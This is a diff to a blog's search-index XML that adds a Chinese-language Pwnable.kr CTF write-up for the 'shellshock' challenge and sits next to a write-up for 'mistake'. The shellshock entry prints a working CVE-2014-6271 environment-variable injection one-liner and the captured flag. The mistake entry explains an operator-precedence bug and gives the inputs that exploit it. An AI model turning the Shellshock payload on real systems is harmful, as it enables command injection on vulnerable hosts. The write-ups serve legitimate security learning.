@@ -17,6 +17,13 @@
 
     
     <entry>
+      <title><![CDATA[Pwnable.kr:shellshock]]></title>
+      <url>%2F2017%2F08%2F01%2FPwnable-kr-shellshock%2F</url>
+      <content type="text"><![CDATA[bash破壳漏洞应用。 题目1234567#include &lt;stdio.h&gt;int main()&#123; setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system("/home/shellshock/bash -c 'echo shock_me'"); return 0;&#125; exp有名的bash破壳漏洞。所以这里不展开了。直接给出exp：123shellshock@ubuntu:~$ env x=&apos;() &#123; :;&#125;; /bin/cat flag&apos; ./shellshockonly if I knew CVE-2014-6271 ten years ago..!!Segmentation fault]]></content>
+    </entry>
+
+    
+    <entry>
       <title><![CDATA[Pwnable.kr:mistake]]></title>
       <url>%2F2017%2F08%2F01%2FPwnable-kr-mistake%2F</url>
       <content type="text"><![CDATA[操作符优先级问题。c语言中=优先级为14，而&lt;优先级为6。 题目1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void xor(char* s, int len)&#123; int i; for(i=0; i&lt;len; i++)&#123; s[i] ^= XORKEY; &#125;&#125;int main(int argc, char* argv[])&#123; int fd; if(fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0)&#123; printf("can't open password %d\n", fd); return 0; &#125; printf("do not bruteforce...\n"); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123; printf("read error\n"); close(fd); return 0; &#125; char pw_buf2[PW_LEN+1]; printf("input password : "); scanf("%10s", pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123; printf("Password OK\n"); system("/bin/cat flag\n"); &#125; else&#123; printf("Wrong Password\n"); &#125; close(fd); return 0;&#125; 分析程序的功能，就是我们输入的十个字符进行xor处理后保存在pw_buf2中，与pw_buf进行比较，若相同则得到flag。 问题出在下面这段代码中：1234if(fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0)&#123; printf("can't open password %d\n", fd); return 0;&#125; 由于&lt;的优先级比=高，所以在open()执行完后，不论是否打开成功，其返回值都大于或者等于零。所以在与0比较后，fd的值为false，在c语言中，即为0。 所以当程序执行到：12345if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123; printf(&quot;read error\n&quot;); close(fd); return 0; &#125; 实际上执行的是：1if(!(len=read(0,pw_buf,PW_LEN) &gt; 0)) 而在unix中，0表示为标准输入流，read(0,pw_buf,PW_LEN)即为从标准输入流中读取字符并保存到pw_buf中。 所以实际上，两个数组的内容都是我们输入的。 exp第一次输入时输入十个字符，比如十个1：11111111111 第二次输入时输入第一次输入十个字符经过异或后的结果：10000000000 flag：1234567891011mistake@ubuntu:~$ ./mistakedo not bruteforce...2input password : 0Wrong Passwordmistake@ubuntu:~$ ./mistakedo not bruteforce...1111111111input password : 0000000000Password OKMommy, the operator priority always confuses me :(]]></content>
